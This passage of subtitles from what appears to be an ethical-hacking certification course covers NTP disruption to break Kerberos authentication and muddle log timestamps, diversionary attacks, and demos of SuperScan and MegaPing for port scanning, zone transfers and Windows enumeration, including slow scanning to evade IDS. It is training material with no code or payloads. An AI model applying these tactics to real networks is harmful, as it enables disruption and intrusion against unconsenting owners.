I'm looking at executing\na denial-of-service attack I know I can\n\n423\n00:20:03.185 --> 00:20:06.710\nde-synchronize and\ndecouple Kerberos and block logons.\n\n424\n00:20:06.710 --> 00:20:10.350\nAnd essentially blow the authentication\nsystem out of the water preventing access\n\n425\n00:20:10.350 --> 00:20:11.260\nto resources.\n\n426\n00:20:11.260 --> 00:20:15.145\nIf all I do is manage to screw up time\nsynchronization by more than five minutes.\n\n427\n00:20:15.145 --> 00:20:16.550\n>> Right.\n>> The default window for\n\n428\n00:20:16.550 --> 00:20:18.613\nKerberos is a five minute time sync.\n\n429\n00:20:18.613 --> 00:20:22.710\nMeaning if I'm out beyond that boundary,\nI can't authenticate as a user and\n\n430\n00:20:22.710 --> 00:20:23.830\nI can't access resources.\n\n431\n00:20:23.830 --> 00:20:25.716\nNow it's easy to fix that,\nby the way, right?\n\n432\n00:20:25.716 --> 00:20:27.571\nAll we gotta do is\nre-synchronize everything and\n\n433\n00:20:27.571 --> 00:20:29.220\nwe're right back up and running.\n\n434\n00:20:29.220 --> 00:20:31.740\nBut the point is, again,\nwhat am I looking for here, right?\n\n435\n00:20:31.740 --> 00:20:33.680\nAs a hacker I'm looking for\n\n436\n00:20:33.680 --> 00:20:37.965\nadvantage, I'm looking at the telltale\nsigns, the map that appears.\n\n437\n00:20:37.965 --> 00:20:42.990\nJust like watching The Matrix when in the\nmovie, remember the first movie, right.\n\n438\n00:20:42.990 --> 00:20:45.490\nWhere the first time you kinda see\n\n439\n00:20:45.490 --> 00:20:47.965\nwhat the matrix looks like on the screen,\nright.\n\n440\n00:20:47.965 --> 00:20:51.980\nWhen the Keanu Reeves character, Neo's\ntalking to whoever's sitting in the chair.\n\n441\n00:20:51.980 --> 00:20:53.230\n>> Yeah, right.\n>> I forget who it was, right.\n\n442\n00:20:53.230 --> 00:20:54.010\n>> Tank or somebody.\n\n443\n00:20:54.010 --> 00:20:56.060\n>> Yeah, right, and\nhe's saying what is that?\n\n444\n00:20:56.060 --> 00:20:57.090\nThat's the matrix, you know.\n\n445\n00:20:57.090 --> 00:20:57.900\nAnd what do you mean?\n\n446\n00:20:57.900 --> 00:20:59.160\nThe Matrix, yeah, well I can look at it.\n\n447\n00:20:59.160 --> 00:21:00.571\nAnd well, what do you mean,\nit's all letters and\n\n448\n00:21:00.571 --> 00:21:01.770\nnumbers just falling down the screen.\n\n449\n00:21:01.770 --> 00:21:03.331\nNow, I can look at it, I can actually see.\n\n450\n00:21:03.331 --> 00:21:06.350\nLike, and he points at it and says look,\nthat's so and so and whatever.\n\n451\n00:21:06.350 --> 00:21:10.740\nWhen you're thinking about that,\nright, it's literally like that here.\n\n452\n00:21:10.740 --> 00:21:12.620\nOr at least,\nthat's how I envision it anyway, right?\n\n453\n00:21:12.620 --> 00:21:14.190\nBecause the bad actor,\n\n454\n00:21:14.190 --> 00:21:17.270\nthe hacker, is looking at this stuff,\nlooking for advantage.\n\n455\n00:21:17.270 --> 00:21:19.580\nLook, there's NTP running,\nwhat does that tell me?\n\n456\n00:21:19.580 --> 00:21:23.310\nLet me yank that piece out, let me look\nat that and see the advantage I can gain.\n\n457\n00:21:23.310 --> 00:21:26.770\nAs a CH we gotta be thinking the same way,\nbut we gotta turn that around and say,\n\n458\n00:21:26.770 --> 00:21:30.305\nokay what advantage am I giving\nthe hacker by exposing this information?\n\n459\n00:21:30.305 --> 00:21:31.550\n>> Right.\n>> Now, how am I gonna\n\n460\n00:21:31.550 --> 00:21:32.690\ndefend against that?\n\n461\n00:21:32.690 --> 00:21:35.880\nWell, when we see NTP running we gotta\nknow that we gotta harden those NTP\n\n462\n00:21:35.880 --> 00:21:36.460\nservers.\n\n463\n00:21:36.460 --> 00:21:40.190\nThey're typically domain controllers\ninside of a Windows based ADDS\n\n464\n00:21:40.190 --> 00:21:43.140\nactive directory,\ndirectory service based domain.\n\n465\n00:21:43.140 --> 00:21:45.625\nOr they may be rack and\nstack appliances, or\n\n466\n00:21:45.625 --> 00:21:50.890\nwe may be syncing out to the atomic clock\nor something like that, right, typically.\n\n467\n00:21:50.890 --> 00:21:55.020\nAnd so, we gotta know that we gotta think\nabout protecting that transmission chain.\n\n468\n00:21:55.020 --> 00:21:57.110\nAre we encrypting our local traffic?\n\n469\n00:21:57.110 --> 00:22:00.450\nAre we securing those servers so\nthat they can't be compromised, right.\n\n470\n00:22:00.450 --> 00:22:01.802\nThose are things we'd wanna think about.\n\n471\n00:22:01.802 --> 00:22:05.160\nCuz as a hacker I'm thinking\nI find the NTP server,\n\n472\n00:22:05.160 --> 00:22:08.820\nI flood it with a denial-of-service\nattack, like a syn flood.\n\n473\n00:22:08.820 --> 00:22:12.450\nI knock it offline and then all of\na sudden, nothing can communicate.\n\n474\n00:22:12.450 --> 00:22:14.633\nAnd at that point,\ncouple of minutes' time drift, and\n\n475\n00:22:14.633 --> 00:22:17.840\neverything stops authenticating,\nand boom, things stop working.\n\n476\n00:22:17.840 --> 00:22:20.581\nAnd more importantly,\nlog files are now no longer accurate.\n\n477\n00:22:20.581 --> 00:22:22.011\n>> Right.\n>> Timestamps are not there,\n\n478\n00:22:22.011 --> 00:22:24.030\nI don't know what was done when.\n\n479\n00:22:24.030 --> 00:22:26.633\nNow as essentially\na covering attack over here,\n\n480\n00:22:26.633 --> 00:22:29.554\nI can now go once I've taken\nout that functionality and\n\n481\n00:22:29.554 --> 00:22:33.920\nessentially limited logging so\nthat it's not really gonna be accurate.\n\n482\n00:22:33.920 --> 00:22:36.000\nIt's gonna record what I'm doing, but\nwe're not gonna have a timestamp.\n\n483\n00:22:36.000 --> 00:22:37.370\nThere's now way to tell when it was done.\n\n484\n00:22:37.370 --> 00:22:39.550\n>> Can't correlate between\ntwo different log files.\n\n485\n00:22:39.550 --> 00:22:41.298\n>> Absolutely.\n>> The events that are going across.\n\n486\n00:22:41.298 --> 00:22:45.660\n>> So now right, I can go in and I can,\nwith my cover running over here,\n\n487\n00:22:45.660 --> 00:22:48.670\nI can go lay down some\ndiversionary attacks somewhere,\n\n488\n00:22:48.670 --> 00:22:50.170\nmake everybody pay attention to those.\n\n489\n00:22:50.170 --> 00:22:52.655\nAnd then I'll go out and\ndo the real attack over here and\n\n490\n00:22:52.655 --> 00:22:55.410\nthere'll be limited if any opportunity\nto figure that out in real\n\n491\n00:22:55.410 --> 00:22:58.750\ntime because those log files are not\ngonna tell you what's happening when.\n\n492\n00:22:58.750 --> 00:22:59.800\nThey will tell you what's happening,\nright.\n\n493\n00:22:59.800 --> 00:23:01.470\nWe haven't talked about how\nto get rid of the logs yet,\n\n494\n00:23:01.470 --> 00:23:03.140\nand we'll talk about that, right.\n\n495\n00:23:03.140 --> 00:23:06.840\nBut the reality is while they're gonna\nrecord it, it's not gonna be correlated,\n\n496\n00:23:06.840 --> 00:23:08.950\nas Mike said,\nwith anything that's in near real time.\n\n497\n00:23:08.950 --> 00:23:11.070\nIt's gonna be real tough for\nme to understand that.\n\n498\n00:23:11.070 --> 00:23:14.950\nSo, again, just by doing a simple scan,\nright, I'm getting all this information.\n\n499\n00:23:14.950 --> 00:23:17.543\nI mean I didn't go down the rest\nof this list, there's 40, 45,\n\n500\n00:23:17.543 --> 00:23:18.865\n50 other machines here.\n\n501\n00:23:18.865 --> 00:23:21.270\nImagine what else I'm gonna find and\nwhat I'd be able to do.\n\n502\n00:23:21.270 --> 00:23:25.065\nWe talked about knowledge of ports and\nknowing the common ports in\n\n503\n00:23:25.065 --> 00:23:27.975\none of our last discussions,\none of the prior episodes.\n\n504\n00:23:27.975 --> 00:23:31.140\nAnd you even went to the trouble of\nputting up a port list from Microsoft.\n\n505\n00:23:31.140 --> 00:23:32.810\nWe walked through some of the common ones,\n\n506\n00:23:32.810 --> 00:23:34.146\nI think you put up another\nport list from Myana.\n\n507\n00:23:34.146 --> 00:23:35.490\n>> Yep.\n>> Or somewhere to show them some of\n\n508\n00:23:35.490 --> 00:23:37.090\nthe ones that weren't\nnecessarily on there.\n\n509\n00:23:37.090 --> 00:23:39.440\nI mentioned a bunch that you\nshould probably be aware of,\n\n510\n00:23:39.440 --> 00:23:42.350\nI think we'll capture that and\nmake sure we have that in a list and\n\n511\n00:23:42.350 --> 00:23:44.510\nactually put a little\nitem in the show notes.\n\n512\n00:23:44.510 --> 00:23:46.090\nYou can download a list of the 20 or\n\n513\n00:23:46.090 --> 00:23:48.780\n30 most common ports we wanna\nmake sure we're aware of.\n\n514\n00:23:48.780 --> 00:23:52.870\nAnd we'll do that but the reality is\nthis is the kind of stuff, right.\n\n515\n00:23:52.870 --> 00:23:55.112\nPeople ask all the time hey,\nhow do you get good at this stuff?\n\n516\n00:23:55.112 --> 00:23:57.590\nHow do you really know,\nhow do you know what to do,\n\n517\n00:23:57.590 --> 00:23:59.366\nhow do you know what's important?\n\n518\n00:23:59.366 --> 00:24:00.668\nHow do you look at something?\n\n519\n00:24:00.668 --> 00:24:02.492\nWhat you're seeing is what it means.\n\n520\n00:24:02.492 --> 00:24:03.628\nThis is what you do.\n\n521\n00:24:03.628 --> 00:24:05.173\nRight.\nI mean, this is exactly what you do.\n\n522\n00:24:05.173 --> 00:24:06.990\nYou look for the upward of tool like this.\n\n523\n00:24:06.990 --> 00:24:10.273\nYou sit down and say to yourself,\nwhat is every port on that mean?\n\n524\n00:24:10.273 --> 00:24:11.041\nWhy is it running?\n\n525\n00:24:11.041 --> 00:24:11.809\nAnd you know what?\n\n526\n00:24:11.809 --> 00:24:12.907\nLet me be honest with you.\n\n527\n00:24:12.907 --> 00:24:15.839\nIt sucks in the beginning to figure\nthis stuff because you got to\n\n528\n00:24:15.839 --> 00:24:17.240\nspend a lot of time.\n\n529\n00:24:17.240 --> 00:24:20.964\nIt's just tedious mind-numbing work,\nand it's boring as hell, right?\n\n530\n00:24:20.964 --> 00:24:22.071\nI'm being honest with ya.\n\n531\n00:24:22.071 --> 00:24:23.950\n>> Mm-hm.\n>> I mean, it's not boring if you like it,\n\n532\n00:24:23.950 --> 00:24:24.590\ndon't get me wrong.\n\n533\n00:24:24.590 --> 00:24:25.180\nIt's exciting but\n\n534\n00:24:25.180 --> 00:24:29.780\nthe truth is you got to spend a lot\nof time just looking at websites,\n\n535\n00:24:29.780 --> 00:24:34.250\nreading on stuff, figuring it out, and\nit's just tedious and monotonous work.\n\n536\n00:24:34.250 --> 00:24:37.040\nWe make it look simple when\nwe do demos like this here.\n\n537\n00:24:37.040 --> 00:24:39.340\nWe make it look simple when\nwe talk about doing it.\n\n538\n00:24:39.340 --> 00:24:43.070\nYou've heard me tell stories in these\nepisodes and all the other shows we've\n\n539\n00:24:43.070 --> 00:24:47.810\ndone, across all the security stuff that I\nspend time talking about here at ITProTV.\n\n540\n00:24:47.810 --> 00:24:49.620\nAnd I make it sound fun, and it is.\n\n541\n00:24:49.620 --> 00:24:50.800\nI love what I do.\n\n542\n00:24:50.800 --> 00:24:53.870\nI love what I've done for 30 something\nyears, doing it all the way through.\n\n543\n00:24:53.870 --> 00:24:57.750\nThere's been some really incredibly\nbad moments, but there's been\n\n544\n00:24:57.750 --> 00:25:00.860\nphenomenal moments, and there's a lot\nmore of those than there are bad moments.\n\n545\n00:25:00.860 --> 00:25:02.640\nAnd the reality is,\nit's a mixture of both.\n\n546\n00:25:02.640 --> 00:25:05.950\nBecause sometimes I'm better\nthan people I go up against,\n\n547\n00:25:05.950 --> 00:25:07.315\nmost of the time by the way.\n\n548\n00:25:07.315 --> 00:25:08.650\n>> [LAUGH].\n>> I'm good at what I do, right.\n\n549\n00:25:08.650 --> 00:25:09.560\nBut not all the time.\n\n550\n00:25:09.560 --> 00:25:12.800\nListen, I'm the first one to admit there's\na whole bunch people after than a lot\n\n551\n00:25:12.800 --> 00:25:14.310\nmore about this stuff than I do.\n\n552\n00:25:14.310 --> 00:25:18.185\nAnd if there are people on the other\nend of keyboard then it's time for\n\n553\n00:25:18.185 --> 00:25:22.095\nme to go get a cup of tea and sit down\na relax a little bit and take a break.\n\n554\n00:25:22.095 --> 00:25:23.385\nCuz I'm not going anywhere.\n\n555\n00:25:23.385 --> 00:25:25.005\nThey're gonna win all the time.\n\n556\n00:25:25.005 --> 00:25:27.115\nSo you've always gotta be\nhumble about what you do.\n\n557\n00:25:27.115 --> 00:25:29.930\nYou've always gotta know there's\npeople out there know more than you.\n\n558\n00:25:29.930 --> 00:25:33.190\nBut you've got to be willing to push\nthat envelope and learn about what you\n\n559\n00:25:33.190 --> 00:25:37.200\ndon't know everyday if you want to really\nbe good at this and stay relevant.\n\n560\n00:25:37.200 --> 00:25:39.310\nIt's easy to get good for a time.\n\n561\n00:25:39.310 --> 00:25:43.380\nThere was a time when that list was a lot\nshorter and it was not very hard to figure\n\n562\n00:25:43.380 --> 00:25:46.670\nout what was on the list and\nnot hard to figure out what they meant.\n\n563\n00:25:46.670 --> 00:25:50.210\nToday, that port list\nis essentially growing\n\n564\n00:25:50.210 --> 00:25:53.150\nbecause we got a lot more services and\nsoftware running in the Cloud.\n\n565\n00:25:53.150 --> 00:25:57.130\nThere's a lot of stuff that runs through\n80 and 443 that's just simply generic that\n\n566\n00:25:57.130 --> 00:25:59.340\nyou then have to ferret\nout through other means.\n\n567\n00:25:59.340 --> 00:26:01.870\nThere's root kits and malware that hides.\n\n568\n00:26:01.870 --> 00:26:05.630\nThis stuff has been going on, but\nit's just becoming more prevalent and\n\n569\n00:26:05.630 --> 00:26:08.580\nmore tediously mind numbing\nto figure out by the day,\n\n570\n00:26:08.580 --> 00:26:11.000\nbecause you gotta spend\nmore time investigating.\n\n571\n00:26:11.000 --> 00:26:12.670\nBut if you wanna be good at this stuff,\n\n572\n00:26:12.670 --> 00:26:14.330\nyou wanna get more than\njust a piece of paper.\n\n573\n00:26:14.330 --> 00:26:16.910\nRight, that says you're\na CEH certified individual.\n\n574\n00:26:16.910 --> 00:26:18.830\nAnd that's the beginning of your journey,\nby the way.\n\n575\n00:26:18.830 --> 00:26:21.450\nAnd it's really important for\nyou to do that.\n\n576\n00:26:21.450 --> 00:26:24.990\nStudying for it, taking this exam,\nproving you have those skills.\n\n577\n00:26:24.990 --> 00:26:27.399\nValidate that knowledge,\nincredibly important.\n\n578\n00:26:27.399 --> 00:26:30.927\nBut it's the first step in a life long\njourney with regards to your career in\n\n579\n00:26:30.927 --> 00:26:32.777\ndoing this stuff and getting the skills.\n\n580\n00:26:32.777 --> 00:26:37.160\nAnd if you're not willing to invest that\ntime then it's been great knowing you, and\n\n581\n00:26:37.160 --> 00:26:38.760\nyou should definitely do this.\n\n582\n00:26:38.760 --> 00:26:42.260\nBut don't ever tell somebody that\nyou're good at doing this and\n\n583\n00:26:42.260 --> 00:26:44.190\nthat they should hire\nyou in order to do this.\n\n584\n00:26:44.190 --> 00:26:46.640\nBecause you're not gonna have the skills\nrequired to be able to do this job\n\n585\n00:26:46.640 --> 00:26:48.550\nprofessionally in the real world.\n\n586\n00:26:48.550 --> 00:26:50.880\nBook learning,\nin other words, is one thing.\n\n587\n00:26:50.880 --> 00:26:52.310\nApplying it in the real world.\n\n588\n00:26:52.310 --> 00:26:55.810\nAnd figuring out why it doesn't work and\nhow to fix it is something very different.\n\n589\n00:26:55.810 --> 00:26:57.190\nSo you just want to make\nsure you're aware of that.\n\n590\n00:26:57.190 --> 00:26:58.890\nLet's go back to the demo environment.\n\n591\n00:26:58.890 --> 00:27:00.550\nGot some more stuff to talk about.\n\n592\n00:27:00.550 --> 00:27:02.320\nAll right, so we did SuperScan.\n\n593\n00:27:02.320 --> 00:27:03.140\n>> How about.\n\n594\n00:27:03.140 --> 00:27:06.830\n>> Actually, let me just go back to\nSuperScan for one quick thing before.\n\n595\n00:27:06.830 --> 00:27:07.415\n>> Sure.\n[INAUDIBLE]\n\n596\n00:27:07.415 --> 00:27:08.130\n>> I give you the mastery of\n\n597\n00:27:08.130 --> 00:27:09.131\nthe Russian roulette wheel there.\n\n598\n00:27:09.131 --> 00:27:10.040\n>> [LAUGH]\n>> We'll play again.\n\n599\n00:27:10.040 --> 00:27:11.350\nSo I just wanted to show you, you know?\n\n600\n00:27:11.350 --> 00:27:13.730\nIn here, aside from all\nthe stuff we just did with that.\n\n601\n00:27:13.730 --> 00:27:15.230\nWe can go in and program in,\n\n602\n00:27:15.230 --> 00:27:17.260\nand this is one of the things\nyou wanna know about SuperScan.\n\n603\n00:27:17.260 --> 00:27:18.410\n>> Yes.\n>> We can program\n\n604\n00:27:18.410 --> 00:27:20.470\nin the different ports we wanna scan for.\n\n605\n00:27:20.470 --> 00:27:23.090\nYeah, by default there's a very\nfew number of ports there\n\n606\n00:27:23.090 --> 00:27:25.440\nthat are actually on that default list,\nright?\n\n607\n00:27:25.440 --> 00:27:28.600\nAnd you've gotta know, because the first\nfew times I used this tool, I'm like,\n\n608\n00:27:28.600 --> 00:27:31.420\nwhy am I only getting like UDP ports,\nwhy am I only able to get five,\n\n609\n00:27:31.420 --> 00:27:32.520\nwhat the hell's going on with that?\n\n610\n00:27:32.520 --> 00:27:33.040\n>> I'm with you there, yep.\n\n611\n00:27:33.040 --> 00:27:35.020\n>> I know for\na fact there's more stuff running.\n\n612\n00:27:35.020 --> 00:27:38.340\nAnd I had to go figure out that\nyou've got both UDP and TCP,\n\n613\n00:27:38.340 --> 00:27:40.410\nand you can see them selected here.\n\n614\n00:27:40.410 --> 00:27:44.730\nAnd I've got the default list that's\nhere and it's not that big but\n\n615\n00:27:44.730 --> 00:27:47.800\nyou do have to go in and\nbasically put in the ports.\n\n616\n00:27:47.800 --> 00:27:50.420\nNow, if you put in a single\nport it's line to limited,\n\n617\n00:27:50.420 --> 00:27:53.120\nif you put in a group you\ncan see it's 67 dash 69.\n\n618\n00:27:53.120 --> 00:27:55.980\nJust put in a range,\nput a little dash there and\n\n619\n00:27:55.980 --> 00:27:59.310\nyou can scan that whole range,\nreal simple to do, no big deal.\n\n620\n00:27:59.310 --> 00:28:00.200\nSo you can do that.\n\n621\n00:28:01.560 --> 00:28:04.660\nWe have scan options,\nwhat's our banner grabbing,\n\n622\n00:28:04.660 --> 00:28:09.460\nhow are we gonna do source IP for\nsin scanning, how fast are we gonna scan?\n\n623\n00:28:09.460 --> 00:28:12.860\nRemember, we talked about low and\nslow versus active and\n\n624\n00:28:12.860 --> 00:28:17.060\nreally just knocking down the front door\nand making a lot of noise when we scan.\n\n625\n00:28:17.060 --> 00:28:19.837\nThe faster you scan,\nthe more noisy the scan is and\n\n626\n00:28:19.837 --> 00:28:24.336\ntherefore the more likely you're going to\nbe found out if we have picket defenses\n\n627\n00:28:24.336 --> 00:28:28.656\nrunning that are looking for this stuff,\nIDSes, IPSes, things like that.\n\n628\n00:28:28.656 --> 00:28:31.899\nSo we just want to make sure we're aware\nthat we have a sliding scale here with\n\n629\n00:28:31.899 --> 00:28:34.480\na delay in milliseconds and\nwe want to figure that out.\n\n630\n00:28:34.480 --> 00:28:36.190\nManipulate the tool accordingly.\n\n631\n00:28:36.190 --> 00:28:37.740\nSo that's important.\n\n632\n00:28:37.740 --> 00:28:40.780\nWe've got a bunch of additional\ntools we can use here to do look-up.\n\n633\n00:28:40.780 --> 00:28:43.850\nSo we have who is, right,\nand look up functionality.\n\n634\n00:28:43.850 --> 00:28:50.176\nSo we could do something like\nwe've done where we do ITpro.tv.\n\n635\n00:28:50.176 --> 00:28:52.950\nAnd we can go ahead and\nwe can do a look-up.\n\n636\n00:28:52.950 --> 00:28:57.340\nWe could do a host name\nIP look-up up there.\n\n637\n00:28:57.340 --> 00:28:58.960\nWe'll get that information.\n\n638\n00:28:58.960 --> 00:29:00.600\nWe can do zone transfers.\n\n639\n00:29:00.600 --> 00:29:03.440\nIt's got a built in tool to be able\nto use other transfers if that DNS\n\n640\n00:29:03.440 --> 00:29:04.610\nserver does it.\n\n641\n00:29:04.610 --> 00:29:09.364\nWe've got, git requests so when HTTP git\nHTTP git request which allows us to do\n\n642\n00:29:09.364 --> 00:29:12.260\nbanner grabbing right off the web server.\n\n643\n00:29:12.260 --> 00:29:15.680\nThere's one there, we got WhoIs.\n\n644\n00:29:15.680 --> 00:29:16.620\nY'all that stuff's right here.\n\n645\n00:29:16.620 --> 00:29:18.690\nAll you gotta do is just hit the button,\nright, so.\n\n646\n00:29:18.690 --> 00:29:21.410\n>> And one of my favorite things about\nSuperScan is the fact that you got all\n\n647\n00:29:21.410 --> 00:29:23.510\nthose additional tools\nkinda buried in there.\n\n648\n00:29:23.510 --> 00:29:24.820\n>> Right, it is pretty cool.\n\n649\n00:29:24.820 --> 00:29:27.836\nAnd so you could go in and\nyou could try to get a zone.\n\n650\n00:29:27.836 --> 00:29:29.544\nWe talked about the value of that, right.\n\n651\n00:29:29.544 --> 00:29:33.880\nWe could do a HTTP git and\nsee if we could do a git request.\n\n652\n00:29:33.880 --> 00:29:35.640\nAnd we can get back that\ninformation Information.\n\n653\n00:29:35.640 --> 00:29:36.430\nYou see that, here,\n\n654\n00:29:36.430 --> 00:29:39.045\nwe might be able to tell something\nabout the web server that's running.\n\n655\n00:29:39.045 --> 00:29:40.740\n>> Mm-hm.\n>> And see if there's information.\n\n656\n00:29:40.740 --> 00:29:43.010\nWe also have Windows enumeration here,\nright?\n\n657\n00:29:43.010 --> 00:29:45.940\nWe can go in and\nenumerate the NetBIOS information,\n\n658\n00:29:45.940 --> 00:29:49.060\nthe registry information on a box,\nall that kinda stuff,\n\n659\n00:29:49.060 --> 00:29:54.090\nso 10.1.230.223.\n\n660\n00:29:54.090 --> 00:29:55.360\nAnd do enumerate.\n\n661\n00:29:55.360 --> 00:29:58.210\nAnd I'm looking at my\nWindows 8.1 machine locally.\n\n662\n00:29:58.210 --> 00:29:59.100\nSo I'm enumerating that.\n\n663\n00:29:59.100 --> 00:30:00.730\nAnd I get a bunch of stuff here.\n\n664\n00:30:00.730 --> 00:30:03.290\nYou can see it's pulling all\nthe NetBIOS information.\n\n665\n00:30:03.290 --> 00:30:06.240\nPulling in the registry keys\nall that kind of stuff.\n\n666\n00:30:06.240 --> 00:30:09.760\nAnd again just check boxes look at\nall the stuff I can go grab or not.\n\n667\n00:30:09.760 --> 00:30:13.980\nKeep in mind this tool is probably I\ndon't know 15 years old at this point.\n\n668\n00:30:13.980 --> 00:30:14.770\n>> Somewhere around there.\n\n669\n00:30:14.770 --> 00:30:17.480\n>> Something like that at least\nit's around the 2000 mark.\n\n670\n00:30:17.480 --> 00:30:20.570\nSo we're talking about a tool\nthat's been around for sometime.\n\n671\n00:30:20.570 --> 00:30:25.560\nAnd yet still, even with Windows 8.1,\nI can put Windows 10 up there and\n\n672\n00:30:25.560 --> 00:30:27.860\nit would still be able to do\nthis kind of stuff, right.\n\n673\n00:30:27.860 --> 00:30:33.030\nSo this is pretty important, yeah,\n2003, so it's 13 years old right now.\n\n674\n00:30:33.030 --> 00:30:36.621\nThat's pretty cool when\nyou think about it.\n\n675\n00:30:36.621 --> 00:30:39.707\nJust showing you some of the stuff\nthat we could be doing there.\n\n676\n00:30:39.707 --> 00:30:40.920\nAnd so that's SuperScan.\n\n677\n00:30:40.920 --> 00:30:43.829\nWhat's next on up on the list there while\nwe're waiting for SuperScan to close?\n\n678\n00:30:43.829 --> 00:30:46.651\n>> We compare and\ncontrast that with MegaPing.\n\n679\n00:30:46.651 --> 00:30:51.680\n>> Ooh, MegaPing all right so\nI'm going for the gold here.\n\n680\n00:30:51.680 --> 00:30:53.070\nI'm gonna bring MegaPing.\n\n681\n00:30:53.070 --> 00:30:55.390\nMegaPing's another tool that\nessentially will do the same thing.\n\n682\n00:30:55.390 --> 00:30:56.950\nYou see it's loading\nthere in the background.\n\n683\n00:30:56.950 --> 00:30:58.450\nWe'll give it a second to come up.\n\n684\n00:30:58.450 --> 00:31:03.120\nAnd what MegaPing's gonna allow us to\ndo is a pretty much very similar to\n\n685\n00:31:03.120 --> 00:31:04.090\nthe SuperScan tool.\n\n686\n00:31:04.090 --> 00:31:07.970\nWell, it's got a little bit more\ninformation associated with it.\n\n687\n00:31:07.970 --> 00:31:09.790\nLIttle bit of a different\nkind of interface, but\n\n688\n00:31:09.790 --> 00:31:13.040\nessentially basically will\ndo very similar things.\n\n689\n00:31:13.040 --> 00:31:14.940\nAnd again I've already free loaded here.\n\n690\n00:31:14.940 --> 00:31:17.730\nSo, we've got the port scanner going on.\n\n691\n00:31:17.730 --> 00:31:20.060\nI scanned a local machine and so,\n\n692\n00:31:20.060 --> 00:31:23.660\nwe could see what's running here I got\na little ports running on my machine.\n\n693\n00:31:23.660 --> 00:31:26.550\nI can remotely scan out across\nthe networks scan any machine I want.\n\n694\n00:31:26.550 --> 00:31:31.970\nBut you see here I've got a port 21, port\n25, all the different ports running here.\n\n695\n00:31:31.970 --> 00:31:36.690\nShows me by the way, not just, which is\ncool, because SuperScan doesn't do this.\n\n696\n00:31:36.690 --> 00:31:40.100\nBut it shows me type,\nshows me the type of port, what it is, but\n\n697\n00:31:40.100 --> 00:31:42.490\nit gives me a risk rating\non running that service.\n\n698\n00:31:42.490 --> 00:31:46.360\nSo for instance, running an FTP is\nan elevated risk because it's not secure.\n\n699\n00:31:46.360 --> 00:31:49.040\nIf I was running secure FTP\nthere would be a low risk.\n\n700\n00:31:49.040 --> 00:31:50.890\nAnd by the way there is\nsuch a thing as secure FTP.\n\n701\n00:31:50.890 --> 00:31:52.950\nPeople don't know that.\n\n702\n00:31:52.950 --> 00:31:54.551\nSo I could be running that.\n\n703\n00:31:54.551 --> 00:31:58.674\nGoing in and running for\ninstance Microsoft's DS,\n\n704\n00:31:58.674 --> 00:32:01.494\nDirectory Service on port 445.\n\n705\n00:32:01.494 --> 00:32:02.953\nNot a big deal right?\n\n706\n00:32:02.953 --> 00:32:05.273\nSo I mean just different things\nwe could be looking at here.\n\n707\n00:32:05.273 --> 00:32:08.355\nNetBIOS Session service elevated risk,\nright?\n\n708\n00:32:08.355 --> 00:32:09.570\nSo I can find that.\n\n709\n00:32:09.570 --> 00:32:12.979\nI can copy this information\nagain documenting it as I go, so\n\n710\n00:32:12.979 --> 00:32:14.350\nthat's pretty basic.\n\n711\n00:32:16.040 --> 00:32:17.590\nAnd I have an option here to scan for\n\n712\n00:32:17.590 --> 00:32:21.060\nauthorized ports,\nhostel ports, range of ports.\n\n713\n00:32:21.060 --> 00:32:22.280\nI can do all sorts of stuff.\n\n714\n00:32:22.280 --> 00:32:24.500\nSo if I wanna scan the machine,\nlooking for\n\n715\n00:32:24.500 --> 00:32:27.430\nhostile ports, right,\nI can scan doing that.\n\n716\n00:32:27.430 --> 00:32:31.280\nIt just brings in the ones that\nare risk-tagged as being elevated or\n\n717\n00:32:31.280 --> 00:32:33.420\nhigh, that's what we call hostile port.\n\n718\n00:32:33.420 --> 00:32:37.460\nSo it gives me a subdivided list and says\nessentially, hey, these may be a problem,\n\n719\n00:32:37.460 --> 00:32:39.040\nI wanna make sure you're aware of them,\nright?\n\n720\n00:32:39.040 --> 00:32:41.050\nSo we could do that, but\nthat's just part of it.\n\n721\n00:32:41.050 --> 00:32:42.860\nWe've got a host monitor.\n\n722\n00:32:42.860 --> 00:32:45.200\nRemember we talked about\nthe fact that we can go in and\n\n723\n00:32:45.200 --> 00:32:46.970\ntake a look at what may be going on.\n\n724\n00:32:46.970 --> 00:32:49.330\nI can take a look at the local\ntime on the machine.\n\n725\n00:32:49.330 --> 00:32:54.180\nI can look at status, is it up and\nrunning, the TTL, the round trip time so\n\n726\n00:32:54.180 --> 00:32:55.960\nI can keep tabs on the machine.\n\n727\n00:32:55.960 --> 00:32:59.370\nWhen I'm doing pin testing,\nand I'm going in, and again,\n\n728\n00:32:59.370 --> 00:33:02.140\nI've got multiple machines up and\nrunning simultaneously.\n\n729\n00:33:02.140 --> 00:33:05.030\nSo I may be scanning\nmachines on the network.\n\n730\n00:33:05.030 --> 00:33:09.404\nI may run a tool like this and scan one of\nthe machines I'm targeting to make sure\n\n731\n00:33:09.404 --> 00:33:12.218\nthat it stays up and\nTTL's don't fluctuate.\n\n732\n00:33:12.218 --> 00:33:15.470\nSo that there's no pickup on\nthe scan side that there's\n\n733\n00:33:15.470 --> 00:33:16.980\ntraffic patterns that are modifying.\n\n734\n00:33:16.980 --> 00:33:19.910\nSo I'm looking to manipulate\nthe information I'm putting\n\n735\n00:33:19.910 --> 00:33:22.830\nout there to make sure it's\nnot being seen incorrectly.\n\n736\n00:33:22.830 --> 00:33:24.210\nLook at security scanner, right?\n\n737\n00:33:24.210 --> 00:33:25.250\nThis item here.\n\n738\n00:33:25.250 --> 00:33:27.190\nI'm able to open up all these machines.\n\n739\n00:33:27.190 --> 00:33:29.910\nI'm able to see the NetBios information,\nif there is any.\n\n740\n00:33:29.910 --> 00:33:31.380\nI'm able to see the adapter address.\n\n741\n00:33:31.380 --> 00:33:32.780\nI can see Mac address.\n\n742\n00:33:32.780 --> 00:33:35.170\nI'm able to see if SNMP is running.\n\n743\n00:33:35.170 --> 00:33:37.360\nAnd I'm able to see what ports are there.\n\n744\n00:33:37.360 --> 00:33:42.295\nSo this combines the TCP port scan along\nwith some other information, right?\n\n745\n00:33:42.295 --> 00:33:42.822\n>> Mm-hm.\n>> And\n\n746\n00:33:42.822 --> 00:33:44.880\nI have the ability to do resolve name.\n\n747\n00:33:44.880 --> 00:33:48.350\nSo a lot of times, I could check things\noff here, and add information in.\n\n748\n00:33:48.350 --> 00:33:50.370\nAnd I also have a report option.\n\n749\n00:33:50.370 --> 00:33:55.055\nI can click here and generate a report and\ndump it into an HTM file, right?\n\n750\n00:33:55.055 --> 00:33:59.581\nJust put that on the desktop,\ndump that right there, and\n\n751\n00:33:59.581 --> 00:34:03.740\nthen, okay,\ndo I wanna customize the report?\n\n752\n00:34:03.740 --> 00:34:06.230\nNo, we'll just go ahead and\nleave that 